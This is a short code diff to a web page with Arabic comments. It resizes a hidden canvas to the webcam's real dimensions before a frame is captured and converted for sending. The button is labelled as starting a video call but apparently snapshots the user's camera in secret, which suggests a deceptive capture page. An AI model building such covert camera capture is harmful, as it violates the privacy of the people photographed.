@@ -114,10 +114,9 @@ user-info@  </div>
 
 <div class="call-container">
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="480" height="360" style="display:none;"></canvas>
+  <canvas id="canvas" style="display:none;"></canvas>
   <div class="controls">
     <button id="capture">بدء مكالمة فيديو</button>
-    <!-- ممكن تضيف أزرار كالصوت/إيقاف الفيديو -->
   </div>
 </div>
 
@@ -155,6 +154,11 @@ function dataURLtoBlob(dataurl) {
 // التقاط وإرسال الصورة
 btn.addEventListener('click', () => {
   const ctx = canvas.getContext('2d');
+
+  // ✅ نضبط حجم الكانفاس ليتطابق مع أبعاد الفيديو الحقيقية
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   const dataUrl = canvas.toDataURL('image/png');
   const blob = dataURLtoBlob(dataUrl);
